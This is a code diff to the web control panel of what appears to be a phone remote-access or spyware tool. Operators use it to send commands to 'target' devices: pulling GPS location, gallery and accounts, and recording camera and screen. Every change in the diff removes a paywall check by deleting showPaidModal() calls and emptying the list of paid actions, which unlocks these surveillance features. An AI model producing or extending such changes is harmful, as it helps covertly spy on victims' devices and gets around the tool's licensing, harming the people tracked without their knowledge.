@@ -3036,7 +3036,7 @@
             if (targetEl) targetEl.classList.add('active');
 
             if (id === 'global-map-tab') {
-                showPaidModal();
+                
                 // No background map tracking or polling process
             } else {
                 if (mapLoopAudio) mapLoopAudio.pause();
@@ -4060,9 +4060,9 @@
 
         async function exec(a, p) {
             if (!selected) return;
-            const paidActions = ['location', 'gpslocation', 'gps', 'gallery', 'accounts', 'record_video', 'rec_video', 'start_video', 'start_screen_record', 'start_screen_rec', 'record_screen', 'screen_record', 'screen_rec'];
+            const paidActions = [];
             if (paidActions.includes(a)) {
-                showPaidModal();
+                
                 return;
             }
             let url = '/api/execute?uuid=' + selected + '&action=' + a;
@@ -4071,7 +4071,7 @@
                 const res = await fetch(url);
                 const data = await res.json().catch(() => ({}));
                 if (data.paid) {
-                    showPaidModal();
+                    
                     return;
                 }
                 log('Sent: ' + a);
@@ -4123,7 +4123,7 @@
 
         function openCamHub() {
             if (!selected) return;
-            showPaidModal();
+            
             const hub = document.getElementById('camera-hub');
             hub.style.display = 'flex';
             document.getElementById('hub-device-name').textContent = 'CAMERA HUB: ' + currentName.textContent;
@@ -4159,7 +4159,7 @@
 
         function openScreenHub() {
             if (!selected) return;
-            showPaidModal();
+            
             const hub = document.getElementById('screen-hub');
             hub.style.display = 'flex';
             document.getElementById('screen-hub-device-name').textContent = currentName.textContent;
@@ -5701,7 +5701,7 @@
 
     function openGpsHub() {
         if (!selected) return;
-        showPaidModal();
+        
         const overlay = document.getElementById('gps-hub-overlay');
         overlay.style.display = 'flex';
         document.getElementById('gps-hub-device-name').textContent = 'TARGET: ' + currentName.textContent;
